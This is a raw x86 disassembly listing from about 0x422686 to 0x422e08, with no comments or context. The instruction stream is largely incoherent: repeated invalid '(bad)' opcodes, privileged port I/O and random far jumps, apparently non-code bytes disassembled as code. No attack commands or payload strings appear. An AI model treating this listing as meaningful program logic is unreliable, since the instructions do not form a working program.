  422686:	sbb    eax,0x734bc814
  42268b:	mov    ebp,0x82053968
  422690:	inc    edi
  422691:	div    edi
  422693:	or     BYTE PTR [ebx-0x18],bh
  422696:	fwait
  422697:	inc    esp
  422698:	clc    
  422699:	mov    ebx,0x32f9fb20
  42269e:	call   esi
  4226a0:	sub    BYTE PTR [ebp-0x3],ch
  4226a3:	add    bl,BYTE PTR [eax-0x50644528]
  4226a9:	(bad)  
  4226aa:	sub    al,0x74
  4226ac:	retf   0x9fea
  4226af:	jg     0x422720
  4226b1:	adc    DWORD PTR [eax+ebp*1+0x5f26bd],0x23
  4226b9:	icebp  
  4226ba:	cs popa 
  4226bc:	jle    0x422710
  4226be:	ds call 0x8153:0xcd44a1cc
  4226c6:	mov    ds:0xa7365a0c,al
  4226cb:	int3   
  4226cc:	out    dx,al
  4226cd:	jnp    0x4226d6
  4226cf:	out    0x8,al
  4226d1:	mov    eax,0x4b6372fb
  4226d6:	out    0xe3,eax
  4226d8:	cmp    esi,DWORD PTR [ecx]
  4226da:	sbb    ch,BYTE PTR [esi+0x67ae2a6e]
  4226e0:	mov    cl,0x70
  4226e2:	rcl    BYTE PTR [ebx+0x7],1
  4226e5:	dec    ebp
  4226e7:	mov    esp,0x7d0baec1
  4226ec:	and    ecx,DWORD PTR [eax-0x219fe831]
  4226f2:	jne    0x42273e
  4226f4:	iret   
  4226f5:	mov    WORD PTR [edi],ds
  4226f7:	ins    DWORD PTR es:[edi],dx
  4226f8:	xchg   ebp,edx
  4226fa:	stos   BYTE PTR es:[edi],al
  4226fb:	(bad)  
  4226fc:	into   
  4226fd:	mov    ebx,0x18ee602c
  422702:	(bad)  
  422703:	int3   
  422704:	pushf  
  422705:	retf   
  422706:	pop    eax
  422707:	or     DWORD PTR [ebx-0x14518514],0xffffff93
  42270e:	out    dx,al
  42270f:	adc    eax,0x74178cb6
  422714:	mov    BYTE PTR ds:0x6555cbbd,ah
  42271a:	stos   BYTE PTR es:[edi],al
  42271b:	ret    0x1ed3
  42271e:	stos   DWORD PTR es:[edi],eax
  42271f:	adc    DWORD PTR [ebx],edx
  422721:	and    al,0x43
  422723:	cmc    
  422724:	imul   edi,DWORD PTR [eax],0xdb4b525a
  42272a:	rcr    al,1
  42272c:	mov    cl,0xdb
  42272e:	dec    ebp
  42272f:	jl     0x422757
  422731:	push   ecx
  422732:	push   esi
  422733:	call   0xecac:0x6296e83b
  42273a:	lea    ebp,[ecx+ebx*4-0x2d65af86]
  422741:	rcr    DWORD PTR [edx+esi*4],0xa3
  422745:	ret    
  422746:	fsubr  QWORD PTR [ecx-0xa]
  422749:	js     0x422762
  42274b:	sub    dh,ch
  42274d:	outs   dx,BYTE PTR ds:[esi]
  42274e:	xor    edx,edx
  422750:	test   eax,esp
  422752:	adc    BYTE PTR [ecx-0x4a8836eb],dh
  422758:	adc    BYTE PTR [edi-0x6],dh
  42275b:	mov    ebp,0xea28f9d8
  422760:	daa    
  422761:	data16 mov bh,0x45
  422764:	lock xchg edi,eax
  422766:	jecxz  0x42273c
  422768:	pop    ss
  422769:	jne    0x4226ef
  42276b:	adc    ch,BYTE PTR ds:0xb80d7434
  422771:	cmp    bl,dh
  422773:	or     BYTE PTR [eax],0x8d
  422776:	xchg   edx,eax
  422777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422778:	dec    ebp
  422779:	cmp    al,0x2a
  42277b:	or     dl,BYTE PTR [ecx]
  42277d:	dec    ebx
  42277e:	mov    ebx,0x3ef58d67
  422783:	mov    bl,0xa0
  422785:	mul    edi
  422787:	pop    ecx
  422788:	sub    BYTE PTR [edx-0x2e],0x80
  42278c:	mov    fs,WORD PTR [edx-0x1c]
  42278f:	fidivr WORD PTR [eax-0x25add12d]
  422795:	jecxz  0x42272b
  422797:	mov    bl,0xb8
  422799:	mov    dl,0x19
  42279b:	mov    dh,0x7d
  42279d:	push   ds
  42279e:	cmp    esi,ebx
  4227a0:	jbe    0x422819
  4227a2:	out    dx,eax
  4227a3:	rol    BYTE PTR [edi+edi*4-0x79],1
  4227a7:	jg     0x422807
  4227a9:	imul   DWORD PTR [edi-0x2a031723]
  4227af:	outs   dx,BYTE PTR ds:[esi]
  4227b1:	stos   DWORD PTR es:[edi],eax
  4227b2:	popa   
  4227b3:	daa    
  4227b4:	gs or  bh,ch
  4227b7:	cmp    al,0xb5
  4227b9:	js     0x422748
  4227bb:	push   edi
  4227bc:	into   
  4227bd:	mov    bl,0xc5
  4227bf:	mov    ah,0xc5
  4227c1:	icebp  
  4227c2:	in     eax,0xee
  4227c4:	sbb    DWORD PTR [ebx-0x10115419],eax
  4227ca:	dec    esp
  4227cb:	adc    BYTE PTR [ecx],dl
  4227cd:	out    0x19,al
  4227cf:	popf   
  4227d0:	fistp  WORD PTR [ebp+0x7e]
  4227d3:	fsubr  st,st(4)
  4227d5:	leave  
  4227d6:	or     eax,0xcda5b52f
  4227db:	xor    DWORD PTR ds:0x93413a99,0x1d
  4227e2:	pop    edx
  4227e3:	pop    ebx
  4227e4:	xchg   edi,eax
  4227e5:	push   ss
  4227e6:	xor    DWORD PTR [edx],edi
  4227e8:	mov    ebp,DWORD PTR [edx-0x76]
  4227eb:	and    al,0x38
  4227ed:	add    cl,BYTE PTR [edi+0x11]
	...
  4227f8:	add    BYTE PTR [eax],al
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx+0x18c9e210],ebx
  422808:	add    BYTE PTR [ebx+0x1a2e8],ah
  42280e:	inc    BYTE PTR [ecx]
  422810:	add    BYTE PTR [eax],al
  422812:	adc    BYTE PTR [ebp-0x30],cl
  422815:	mov    ebx,0xaf550390
  42281a:	dec    ebp
  42281b:	outs   dx,DWORD PTR ds:[esi]
  42281c:	inc    ebx
  42281d:	lods   eax,DWORD PTR ds:[esi]
  42281e:	push   ebp
  42281f:	mov    ebx,0xe87a2deb
  422824:	jno    0x422804
  422826:	jnp    0x42287b
  422828:	cmp    al,0x23
  42282a:	jmp    0xba76:0xbeeb8280
  422831:	enter  0x88c6,0xbe
  422835:	sbb    eax,ebx
  422837:	or     al,0xec
  42283a:	cmc    
  42283b:	xchg   dl,dh
  42283d:	sub    esp,ecx
  42283f:	jns    0x422856
  422841:	ficom  WORD PTR [eax-0xcffd97e]
  422847:	and    al,BYTE PTR [esi-0x9999da5]
  42284d:	lods   al,BYTE PTR ds:[esi]
  42284e:	(bad)  
  42284f:	cmpxchg BYTE PTR [eax+0x63],bh
  422853:	into   
  422854:	mov    bl,0xc
  422856:	loopne 0x422882
  422858:	jp     0x4228d9
  42285a:	xor    dl,BYTE PTR [esi-0x79]
  42285d:	or     ax,0xa10f
  422861:	in     eax,dx
  422862:	sub    edi,DWORD PTR [edx+ebx*4-0x7f]
  422866:	pop    esp
  422867:	sar    BYTE PTR [eax],1
  422869:	pop    eax
  42286a:	not    bl
  42286c:	adc    esi,DWORD PTR [ebx+0x42]
  42286f:	lods   al,BYTE PTR ds:[esi]
  422870:	dec    ebp
  422871:	jns    0x42282c
  422873:	es pop ecx
  422875:	mov    ds:0x17b71ebd,al
  42287a:	xchg   esi,eax
  42287b:	add    bh,cl
  42287d:	lods   al,BYTE PTR ds:[esi]
  42287e:	fdivrp st(0),st
  422880:	popa   
  422881:	inc    eax
  422882:	xchg   DWORD PTR [ebx-0xb10fb43],edi
  422888:	inc    edi
  422889:	add    ah,ah
  42288b:	icebp  
  42288c:	xor    ah,BYTE PTR [eax+0x29caab96]
  422892:	jno    0x4228fd
  422894:	xchg   ebp,eax
  422895:	mov    es,WORD PTR [eax]
  422897:	add    eax,0x35b1f01
  42289c:	sbb    al,0x56
  42289e:	popf   
  42289f:	dec    ebx
  4228a0:	adc    DWORD PTR [ebx],esp
  4228a2:	js     0x4228bf
  4228a4:	pop    ds
  4228a5:	cli    
  4228a6:	imul   edi,DWORD PTR [edi+0x4b],0x58
  4228aa:	and    al,0xc9
  4228ac:	dec    edi
  4228ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228ae:	adc    al,0xa7
  4228b0:	stos   DWORD PTR es:[edi],eax
  4228b1:	or     eax,0xe2d7a51a
  4228b6:	add    esi,ecx
  4228b8:	stc    
  4228b9:	ins    DWORD PTR es:[edi],dx
  4228ba:	cs retf 
  4228bc:	cli    
  4228bd:	push   es
  4228be:	out    0x5c,al
  4228c0:	xchg   ebx,eax
  4228c1:	pop    ebx
  4228c2:	loope  0x422864
  4228c4:	in     al,dx
  4228c5:	retf   
  4228c6:	mov    ebp,0x6caf35a4
  4228cb:	nop
  4228cc:	mov    bh,0x99
  4228ce:	ds enter 0x1d59,0x36
  4228d3:	push   es
  4228d4:	test   BYTE PTR [eax+0x4a0fb961],0x86
  4228db:	cmp    edi,ebx
  4228dd:	rcl    DWORD PTR [edi],1
  4228df:	pop    es
  4228e0:	push   eax
  4228e1:	jns    0x42292c
  4228e3:	inc    ebp
  4228e4:	or     BYTE PTR [ecx-0x7a],0xa
  4228e8:	cmp    al,0x25
  4228ea:	clc    
  4228eb:	ja     0x4228bb
  4228ed:	pop    ds
  4228ee:	sub    cl,dh
  4228f0:	nop
  4228f1:	or     al,0x50
  4228f3:	lds    edx,FWORD PTR [edi+eax*4-0x1ecabb57]
  4228fa:	adc    DWORD PTR [edi+0x42],ebp
  4228fd:	push   eax
  4228fe:	pusha  
  4228ff:	(bad)  
  422900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422901:	cs jle 0x422940
  422904:	test   BYTE PTR [ebp-0x71],bh
  422907:	push   ss
  422908:	or     DWORD PTR [ebp+0x414e9db3],edi
  42290e:	ins    DWORD PTR es:[edi],dx
  42290f:	pop    edi
  422910:	lds    esi,FWORD PTR ds:0xc698576c
  422916:	popa   
  422917:	push   ebp
  422918:	arpl   WORD PTR [ebx-0x73e83fb3],bp
  42291e:	leave  
  42291f:	mov    edx,0xf3ddfeaf
  422924:	cs jmp 0x422943
  422927:	cmp    DWORD PTR [esi-0x54],ecx
  42292a:	inc    ecx
  42292b:	ss xchg ecx,eax
  42292d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42292e:	cmp    al,0xed
  422930:	cmp    ah,dh
  422932:	cmp    al,0xf
  422934:	xchg   BYTE PTR [esi],dh
  422936:	mov    bl,0x24
  422938:	push   0x78
  42293a:	fldenv ds:[ebx]
  42293d:	out    dx,eax
  42293e:	inc    esp
  42293f:	loope  0x42293b
  422941:	loop   0x422952
  422943:	jmp    0x42295e
  422945:	rcr    ebp,cl
  422947:	or     DWORD PTR [edx],eax
  422949:	push   ss
  42294a:	in     al,0x94
  42294c:	out    dx,eax
  42294d:	(bad)  
  42294e:	pop    esi
  42294f:	cli    
  422950:	inc    edx
  422951:	mov    ch,0xba
  422953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422954:	dec    eax
  422955:	pop    esi
  422956:	pop    ebx
  422957:	add    dh,BYTE PTR [ebx]
  422959:	cli    
  42295a:	imul   ebp,DWORD PTR [edx+0x2c],0xffffffef
  42295e:	neg    DWORD PTR [ebx-0x6c]
  422961:	xchg   edx,eax
  422962:	lods   eax,DWORD PTR ds:[esi]
  422963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422964:	dec    eax
  422965:	in     eax,0x56
  422967:	popf   
  422968:	pop    ds
  422969:	cmc    
  42296a:	je     0x422960
  42296c:	fbld   TBYTE PTR [ecx+0x421fa22b]
  422972:	add    eax,0x58505c5b
  422977:	out    0xc9,al
  422979:	shr    dl,1
  42297b:	mov    eax,edi
  42297d:	das    
  42297e:	jl     0x422957
  422980:	std    
  422981:	sbb    al,0x34
  422983:	jmp    0xd5b03f86
  422988:	mov    gs:0x30344f50,al
  42298e:	je     0x42294f
  422990:	dec    edx
  422991:	popf   
  422992:	dec    edx
  422993:	jb     0x4229d9
  422995:	adc    eax,0xb1bfa85b
  42299a:	jne    0x422945
  42299c:	cmp    DWORD PTR [edx],ecx
  42299e:	loop   0x4229d8
  4229a0:	enter  0x2c9a,0x90
  4229a4:	popa   
  4229a5:	pop    es
  4229a6:	add    dh,BYTE PTR fs:[edx]
  4229a9:	mov    cl,0x87
  4229ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229ac:	imul   ecx,DWORD PTR [ebp+0x69],0x486cf3b4
  4229b3:	repz scas eax,DWORD PTR es:[edi]
  4229b5:	dec    esi
  4229b6:	pop    ds
  4229b7:	nop
  4229b8:	call   0xd413:0xc78eec03
  4229bf:	push   ss
  4229c0:	cmp    BYTE PTR [edi],bh
  4229c2:	ja     0x422a0b
  4229c4:	mov    WORD PTR [eax+edi*4],cs
  4229c7:	inc    edi
  4229c8:	sub    ch,al
  4229ca:	and    al,0x70
  4229cc:	or     ebx,ecx
  4229ce:	adc    edi,edi
  4229d0:	and    al,0xde
  4229d2:	or     al,0x8f
  4229d4:	push   ss
  4229d5:	push   edx
  4229d6:	dec    esp
  4229d7:	scas   al,BYTE PTR es:[edi]
  4229d8:	dec    eax
  4229d9:	cld    
  4229da:	mov    al,0xc
  4229dc:	mov    esi,0x3d918a26
  4229e1:	sbb    DWORD PTR [edx+edi*2-0x75],edi
  4229e5:	scas   eax,DWORD PTR es:[edi]
  4229e6:	sbb    ebp,DWORD PTR [eax]
  4229e8:	xor    DWORD PTR [eax+0x6a],edx
  4229eb:	add    BYTE PTR [ebx],al
  4229ed:	ret    
  4229ee:	mov    esp,0x9fc9e3a0
  4229f3:	xor    eax,0x6ddc7284
  4229f8:	mov    al,ds:0x6d3a5dd9
  4229fd:	add    eax,0x46e893c1
  422a02:	gs aad 0xf5
  422a05:	test   eax,0x302f15de
  422a0a:	retf   
  422a0b:	sahf   
  422a0c:	mov    esp,0x3eea31
	...
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	mov    edx,0xe66c9279
  422a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a2c:	add    DWORD PTR [eax],eax
  422a2e:	inc    BYTE PTR [ecx]
  422a30:	add    BYTE PTR [eax],al
  422a32:	or     eax,DWORD PTR [eax-0x14]
  422a35:	xchg   bh,ah
  422a37:	or     al,0x3d
  422a39:	pop    es
  422a3a:	mov    ecx,edi
  422a3c:	leave  
  422a3d:	push   eax
  422a3e:	xchg   BYTE PTR [edi],al
  422a40:	mov    dl,0x3e
  422a42:	xchg   esp,eax
  422a43:	add    eax,DWORD PTR [ebx-0x36]
  422a46:	jle    0x4229e1
  422a48:	lea    eax,[esi-0x35]
  422a4b:	ror    DWORD PTR [esi+0x75],1
  422a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a4f:	inc    edx
  422a50:	(bad)  
  422a51:	push   ds
  422a52:	cmp    eax,0xb4b22754
  422a57:	inc    edx
  422a58:	aaa    
  422a59:	fmul   QWORD PTR [ebp+0x483f9f6e]
  422a5f:	inc    eax
  422a60:	imul   esi,DWORD PTR [ecx],0x3d
  422a63:	in     al,0x71
  422a65:	cmp    al,BYTE PTR [ebx+0x1bd86871]
  422a6b:	mov    ds:0x152cdd96,eax
  422a70:	rcl    DWORD PTR [ecx-0x77],0x0
  422a74:	push   esi
  422a75:	mov    ds:0xffee9327,eax
  422a7a:	xor    dl,BYTE PTR [eax]
  422a7c:	cmp    ecx,ebx
  422a7e:	xchg   DWORD PTR [ecx],esp
  422a80:	dec    ecx
  422a81:	(bad)  
  422a82:	pop    esp
  422a83:	mov    cl,0x15
  422a85:	xchg   edx,eax
  422a86:	dec    edx
  422a87:	or     al,0x62
  422a89:	jmp    0x422a1b
  422a8b:	test   BYTE PTR ss:[edi],dl
  422a8e:	mov    ebp,DWORD PTR [ecx]
  422a90:	and    al,0xb2
  422a92:	ins    BYTE PTR es:[edi],dx
  422a93:	data16 shl BYTE PTR [esi-0x3bf6dd7e],0xff
  422a9b:	pop    ss
  422a9c:	jecxz  0x422af0
  422a9e:	and    BYTE PTR [edx],bl
  422aa0:	ror    DWORD PTR [esi-0x4f],0x8
  422aa4:	jo     0x422b22
  422aa6:	cli    
  422aa7:	call   0xe4e40608
  422aac:	or     ebp,DWORD PTR [edi]
  422aae:	mov    dl,0x5a
  422ab0:	xchg   esp,eax
  422ab1:	sbb    ch,BYTE PTR [ebx]
  422ab3:	push   ds
  422ab4:	stos   BYTE PTR es:[edi],al
  422ab5:	dec    edi
  422ab6:	scas   al,BYTE PTR es:[edi]
  422ab7:	push   ecx
  422ab8:	ret    
  422ab9:	or     cl,BYTE PTR [ebp+0x3ed51108]
  422abf:	sbb    DWORD PTR [esi-0x62f4b2e8],ebp
  422ac5:	jl     0x422ae4
  422ac7:	jmp    0xea93:0xf65b8d19
  422ace:	mov    dh,0x4f
  422ad0:	jmp    0x422b2a
  422ad2:	push   ebp
  422ad3:	add    DWORD PTR [ebp+0x6428fadd],ecx
  422ad9:	sbb    cl,BYTE PTR [ebx-0x5ecaf811]
  422adf:	xor    ah,BYTE PTR [edi+0x6f]
  422ae2:	test   DWORD PTR [esi-0x72],esi
  422ae5:	mov    esp,DWORD PTR [edi+0x5f]
  422ae8:	xchg   edx,eax
  422ae9:	pop    ss
  422aea:	cdq    
  422aeb:	aam    0x3
  422aed:	test   DWORD PTR [esi],esp
  422aef:	inc    ebx
  422af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422af2:	jb     0x422a7e
  422af4:	pop    eax
  422af5:	pop    edi
  422af6:	and    ebx,esp
  422af8:	or     al,0xb3
  422afa:	ret    
  422afb:	fidiv  DWORD PTR [eax-0x2e]
  422afe:	mov    al,ds:0xda0bf88f
  422b03:	or     al,0xef
  422b05:	mov    edx,0x9ebe10b
  422b0a:	dec    eax
  422b0b:	add    BYTE PTR [eax-0x901faa2],ah
  422b11:	sub    DWORD PTR [edi-0x7f99173c],edx
  422b17:	fcmovbe st,st(4)
  422b19:	jb     0x422b44
  422b1b:	in     al,dx
  422b1c:	push   esp
  422b1d:	dec    edi
  422b1e:	mov    ecx,DWORD PTR [ebp-0x80]
  422b21:	(bad)  [esi-0x14]
  422b24:	mov    ebx,0x55695450
  422b29:	stc    
  422b2a:	lods   eax,DWORD PTR ds:[esi]
  422b2b:	imul   edi,DWORD PTR [ebx+0x6cbdb956],0xffffffa8
  422b32:	pushf  
  422b33:	repz add eax,0xfde25e31
  422b39:	inc    esi
  422b3a:	cmp    edx,DWORD PTR [ebx+0x27]
  422b3d:	rcl    DWORD PTR [ebp+0x57b411dc],1
  422b43:	add    DWORD PTR [edx-0x126ff673],ebx
  422b49:	outs   dx,BYTE PTR ds:[esi]
  422b4a:	pop    ecx
  422b4b:	fwait
  422b4c:	dec    eax
  422b4d:	cs stos BYTE PTR es:[edi],al
  422b4f:	fbld   TBYTE PTR ds:0x59b879f6
  422b55:	pusha  
  422b56:	jne    0x422b91
  422b58:	and    BYTE PTR [ebx-0x50],al
  422b5b:	inc    esi
  422b5c:	sbb    al,0x86
  422b5e:	out    0x47,eax
  422b60:	lock add DWORD PTR [edi+edi*2-0x4c],esi
  422b65:	jmp    0xfa24:0x2e96e551
  422b6c:	mov    ah,0x82
  422b6e:	xor    DWORD PTR [ebx+0xb],edx
  422b71:	pop    eax
  422b72:	sub    al,0xde
  422b74:	dec    ebx
  422b75:	(bad)  
  422b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b77:	ret    
  422b78:	mov    ebp,0x1138a78e
  422b7d:	pop    esp
  422b7e:	into   
  422b7f:	and    BYTE PTR [edx],ch
  422b81:	shl    DWORD PTR es:[edx],1
  422b84:	push   ss
  422b85:	scas   eax,DWORD PTR es:[di]
  422b87:	in     al,0x5a
  422b89:	jge    0x422b27
  422b8b:	or     ebp,ebx
  422b8d:	daa    
  422b8e:	rcl    bh,0xb8
  422b91:	sub    eax,0x9a4cb575
  422b96:	(bad)  
  422b98:	cwde   
  422b99:	xor    eax,0xb55ce42f
  422b9e:	xchg   ecx,eax
  422b9f:	mov    cl,ch
  422ba1:	sub    DWORD PTR [esi+0x2a],ecx
  422ba4:	sbb    al,0xc7
  422ba6:	ins    BYTE PTR es:[edi],dx
  422ba7:	dec    ebp
  422ba8:	jns    0x422b51
  422baa:	mov    al,0x56
  422bac:	dec    esp
  422bad:	test   DWORD PTR [ebp+0x22],esp
  422bb0:	cli    
  422bb1:	or     al,0x4c
  422bb3:	sub    eax,0x1c64ced4
  422bb8:	dec    ecx
  422bb9:	dec    esi
  422bba:	jle    0x422c12
  422bbc:	inc    edi
  422bbd:	daa    
  422bbe:	mov    dl,ch
  422bc0:	out    dx,al
  422bc1:	lods   eax,DWORD PTR ds:[esi]
  422bc2:	mov    esi,0x626248b3
  422bc7:	sub    al,0x8f
  422bc9:	add    ebp,esp
  422bcb:	xchg   esp,eax
  422bcc:	div    dl
  422bce:	jmp    0xfe2e:0xb7885821
  422bd5:	cmp    al,bh
  422bd7:	stos   DWORD PTR es:[edi],eax
  422bd8:	adc    BYTE PTR [edi],al
  422bda:	mov    BYTE PTR [eax],ah
  422bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bdd:	cmp    DWORD PTR ds:0x9990d1ae,ebx
  422be3:	cmc    
  422be4:	sub    dh,BYTE PTR [eax+esi*1-0x7ae49b0d]
  422beb:	or     al,0x49
  422bed:	fs mov ch,0xff
  422bf0:	push   cs
  422bf1:	loop   0x422bc9
  422bf3:	repz jns 0x422c17
  422bf6:	out    0x4a,al
  422bf8:	jmp    0x422bf1
  422bfa:	fld    st(4)
  422bfc:	mov    BYTE PTR [eax+0x43],cl
  422bff:	sbb    eax,0x73ad3122
  422c04:	or     BYTE PTR [ecx+0xa],cl
  422c07:	pop    edi
  422c08:	or     al,BYTE PTR [esi-0x59]
  422c0b:	stos   BYTE PTR es:[edi],al
  422c0c:	(bad)  
  422c0e:	fisubr WORD PTR [ebp+edx*1-0x55]
  422c12:	jno    0x422c75
  422c14:	dec    esp
  422c15:	nop
  422c16:	mov    bh,0x89
  422c18:	jns    0x422bb0
  422c1a:	xchg   BYTE PTR [ecx+0x6c],dh
  422c1d:	ja     0x422bb4
  422c1f:	lods   eax,DWORD PTR ds:[esi]
  422c20:	jns    0x422c56
  422c22:	jle    0x422be0
  422c24:	(bad)  
  422c25:	jbe    0x422c68
  422c27:	dec    ecx
  422c28:	jbe    0x422c84
  422c2a:	and    dl,BYTE PTR [esi-0x64]
  422c2d:	inc    eax
  422c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c2f:	inc    eax
	...
  422c38:	add    BYTE PTR [eax],al
  422c3a:	xor    eax,0xbf06168e
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    esp,DWORD PTR [edx]
  422c47:	sbb    eax,0xa6e4548c
  422c4c:	add    DWORD PTR [eax],eax
  422c4e:	inc    BYTE PTR [ecx]
  422c50:	add    BYTE PTR [eax],al
  422c52:	mov    dh,0xcf
  422c54:	test   eax,0x433f5517
  422c59:	enter  0xcd95,0x1
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c5f:	cmp    eax,0x392f0187
  422c64:	mov    ah,0xca
  422c66:	in     eax,dx
  422c67:	sbb    edi,ebx
  422c69:	inc    esi
  422c6a:	gs cmp al,0xa8
  422c6d:	aad    0xa9
  422c6f:	mov    al,ds:0x19cdb57b
  422c74:	xor    DWORD PTR [ecx-0x2a],ebx
  422c77:	psubusb mm7,mm6
  422c7a:	adc    eax,0x4eabb370
  422c7f:	mov    ch,ch
  422c81:	lock xor BYTE PTR [edx-0x33bff2d2],0xea
  422c89:	fistp  QWORD PTR [edi-0x64336f0d]
  422c8f:	mov    esp,0x74998e3f
  422c94:	in     eax,0xcf
  422c96:	mov    ds:0xb1dd51ae,al
  422c9b:	sbb    DWORD PTR [esi-0x5fa4016b],ebx
  422ca1:	mov    al,0x83
  422ca3:	loope  0x422cf0
  422ca5:	popa   
  422ca6:	push   cs
  422ca7:	popa   
  422ca8:	nop
  422ca9:	loopne 0x422cbf
  422cab:	jp     0x422d26
  422cad:	fcomp  QWORD PTR [edx]
  422caf:	xor    ebx,ecx
  422cb1:	cli    
  422cb2:	rol    DWORD PTR [eax+esi*4-0x66],1
  422cb6:	imul   DWORD PTR [edi]
  422cb8:	mov    eax,?
  422cba:	push   es
  422cbb:	and    al,0x6a
  422cbd:	fwait
  422cbe:	dec    esi
  422cbf:	jo     0x422c79
  422cc1:	not    edi
  422cc3:	stc    
  422cc4:	outs   dx,BYTE PTR ds:[esi]
  422cc5:	sbb    BYTE PTR [edi],dl
  422cc7:	shr    DWORD PTR [esi+0x2505d0ea],1
  422ccd:	ja     0x422cd7
  422ccf:	retf   
  422cd0:	dec    esp
  422cd1:	dec    ebp
  422cd2:	xor    DWORD PTR fs:[esi],ebp
  422cd5:	jo     0x422d48
  422cd7:	xor    eax,esp
  422cd9:	pushf  
  422cda:	inc    edx
  422cdb:	sahf   
  422cdc:	jnp    0x422c61
  422cde:	jmp    0x26ec:0xd3c6b6a6
  422ce5:	mov    al,ds:0xc31e5d1c
  422cea:	push   ds
  422ceb:	cdq    
  422cec:	mov    eax,0x8e0c7c75
  422cf1:	inc    edi
  422cf2:	(bad)  
  422cf3:	rcr    BYTE PTR [eax-0x57426eb6],1
  422cf9:	cwde   
  422cfa:	xor    eax,0x2ec9026b
  422cff:	mov    al,bh
  422d01:	daa    
  422d02:	retf   
  422d03:	sbb    BYTE PTR [ebx],ch
  422d05:	mov    al,ds:0xc0e60931
  422d0a:	shl    ebx,cl
  422d0c:	fs clc 
  422d0e:	xchg   edi,eax
  422d0f:	jae    0x422d03
  422d11:	dec    eax
  422d12:	ja     0x422d32
  422d14:	sub    ebp,ebp
  422d16:	pop    edi
  422d17:	shr    ebx,0x56
  422d1a:	retf   0x240f
  422d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d1e:	test   BYTE PTR ds:0xf53ead76,cl
  422d24:	xor    ah,al
  422d26:	hlt    
  422d27:	lahf   
  422d28:	ds mov bl,0xe1
  422d2b:	enter  0x6c00,0xc3
  422d2f:	shr    dl,0xe7
  422d32:	lock das 
  422d34:	push   ebp
  422d35:	sbb    eax,0x2ab7acce
  422d3a:	sub    DWORD PTR [edx-0x55578a4c],edx
  422d40:	stc    
  422d41:	outs   dx,BYTE PTR ds:[esi]
  422d42:	pop    esi
  422d43:	cdq    
  422d44:	shl    BYTE PTR [esi],cl
  422d46:	mov    cs,WORD PTR [ecx-0x49]
  422d49:	xchg   BYTE PTR [edi],ch
  422d4b:	in     eax,dx
  422d4c:	test   al,0xd6
  422d4e:	or     BYTE PTR [edi-0x44aeef0e],cl
  422d54:	(bad)  
  422d55:	je     0x422cef
  422d57:	xchg   BYTE PTR [ebp-0x48c1035b],dl
  422d5d:	pop    edi
  422d5e:	inc    edx
  422d5f:	daa    
  422d60:	sbb    esi,ebp
  422d62:	outs   dx,DWORD PTR fs:[esi]
  422d64:	mov    ecx,0xf75fbf13
  422d69:	mov    DWORD PTR [eax+0x4b8b74c6],edi
  422d6f:	push   ebx
  422d70:	or     DWORD PTR [ebx+0x30656366],edi
  422d76:	inc    edx
  422d77:	shl    ecx,0xcf
  422d7a:	adc    BYTE PTR [ecx+0x7f],al
  422d7d:	mov    cl,0x49
  422d7f:	std    
  422d80:	jae    0x422d90
  422d82:	sub    edx,DWORD PTR [eax+ecx*4-0x3bd49bee]
  422d89:	mov    eax,0x275c9c67
  422d8e:	outs   dx,BYTE PTR ds:[esi]
  422d8f:	pop    ss
  422d90:	mov    dl,0xf6
  422d92:	push   ss
  422d93:	ja     0x422dc4
  422d95:	and    ax,0xe712
  422d99:	in     al,dx
  422d9a:	cmp    edx,DWORD PTR [edx-0x3d64f704]
  422da0:	xor    DWORD PTR [edx],ebp
  422da2:	mov    esp,0xa6cd4996
  422da7:	xchg   edi,eax
  422da8:	mov    ds:0xc50264b6,al
  422dad:	jl     0x422dfb
  422daf:	inc    BYTE PTR [eax+0x1f]
  422db2:	inc    esp
  422db3:	jg     0x422d4a
  422db5:	push   0xf324f8a7
  422dba:	hlt    
  422dbb:	mov    esi,0xf307f7b9
  422dc0:	adc    edx,DWORD PTR [eax+edi*8]
  422dc3:	adc    al,0x71
  422dc5:	cmp    eax,0x6a2e1347
  422dca:	cmp    al,0x8a
  422dcc:	pusha  
  422dcd:	(bad)  
  422dce:	cmp    al,0xf8
  422dd0:	test   eax,0x5c2efba5
  422dd5:	ins    DWORD PTR es:[edi],dx
  422dd6:	sub    eax,0xd76e910e
  422ddb:	or     DWORD PTR [ebx-0x42b1693a],eax
  422de1:	inc    ebp
  422de2:	out    dx,eax
  422de3:	sub    BYTE PTR [ebx-0x3f],0x77
  422de7:	cld    
  422de8:	outs   dx,DWORD PTR ds:[esi]
  422de9:	out    dx,eax
  422dea:	inc    edx
  422deb:	push   eax
  422dec:	pop    eax
  422ded:	or     eax,0x66ca7514
  422df2:	ret    
  422df3:	enter  0x9384,0xf5
  422df7:	fdiv   DWORD PTR [ecx+0x3d]
  422dfa:	push   edi
  422dfb:	jmp    FWORD PTR [ebx]
  422dfd:	neg    esi
  422dff:	ja     0x422dc6
  422e01:	sub    al,0x42
  422e03:	ins    BYTE PTR es:[edi],dx
  422e04:	sub    edi,ebx
  422e06:	dec    esi
  422e07:	sti    
  422e08:	mov    esp,0x33a84d29
